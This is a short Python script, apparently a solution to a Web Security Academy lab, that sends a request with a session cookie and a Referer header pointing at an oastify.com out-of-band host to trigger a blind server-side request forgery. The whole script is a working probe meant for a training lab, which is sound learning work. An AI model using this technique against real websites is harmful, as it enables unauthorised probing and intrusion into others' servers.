import requests

url = 'https://0a7100140421e41281d7841200840040.web-security-academy.net/product?productId=1'

header = {
    'Cookie' : 'session=C7NcXjps40eAHC0qnJZEsxqz5omt4wgF',
    'Referer' : 'http://z886bru7uv1xygos7kl5brejjap1dr1g.oastify.com',
}

response = requests.get(url, headers=header)
print(f'response = {response.status_code}')
print(f"Response Body: {response.text}")